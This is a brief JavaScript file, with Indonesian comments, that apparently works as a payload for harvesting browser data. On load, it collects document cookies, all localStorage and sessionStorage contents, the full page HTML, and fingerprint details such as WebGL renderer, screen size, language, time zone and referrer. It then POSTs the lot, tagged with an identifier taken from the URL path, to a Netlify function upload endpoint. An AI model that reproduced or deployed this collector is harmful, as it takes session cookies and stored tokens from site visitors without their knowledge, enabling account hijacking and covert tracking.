function getWebGLInfo() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return { error: "WebGL not supported" };
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
    };
}

function sendInfo(identifier) {
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }
    const sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionStorageData[key] = sessionStorage.getItem(key);
    }
    const language = navigator.language || navigator.userLanguage;
    const data = {
        identifier: identifier,
        url: window.location.href,
        cookies: document.cookie,
        domStructure: document.documentElement.outerHTML,
        localStorageData: localStorageData,
        sessionStorageData: sessionStorageData,
        webGLInfo: getWebGLInfo(),
        screenResolution: { width: window.screen.width, height: window.screen.height },
        language: language,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referringURL: document.referrer,
        timestamp: new Date().toISOString()
    };
    fetch('/.netlify/functions/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify(data)
    })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch((error) => console.error(error));
}

// Ambil identifier dari URL
const path = window.location.pathname; // Misalnya: /payloadreferer
const identifier = path.split('/')[1]; // Ambil bagian setelah "/"
sendInfo(identifier);